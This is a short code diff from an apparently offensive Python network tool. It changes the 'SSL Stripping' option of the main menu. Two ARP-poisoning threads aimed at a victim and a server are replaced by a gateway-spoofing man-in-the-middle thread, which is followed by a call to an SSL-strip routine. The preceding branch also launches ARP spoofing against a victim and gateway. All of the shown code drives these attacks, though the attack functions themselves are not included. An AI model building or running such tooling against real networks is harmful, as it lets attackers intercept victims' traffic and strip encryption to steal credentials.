@@ -76,10 +76,8 @@ def main():
         arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
     elif attack.lower() == "e":
         print("SSL Stripping...")
-        arp_poison_thread_victim = threading.Thread(target=arp_poison.persistentPoisoningVictim, args=(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN))
-        arp_poison_thread_server = threading.Thread(target=arp_poison.persistentPoisoningServer, args=(ipServerLAN, macServerLAN, ipVictimLAN, macAttackerLAN, interfaceLAN))
-        arp_poison_thread_victim.start()
-        arp_poison_thread_server.start()
+        mitm = threading.Thread(target=arp_mitm_gateway.gateway_spoof, args=(ipVictimNAT, macVictimNAT, ipGateway, macAttackerNAT, interfaceNAT))
+        mitm.start()
         ssl_strip.ssl_strip(interfaceNAT)
 
     else:
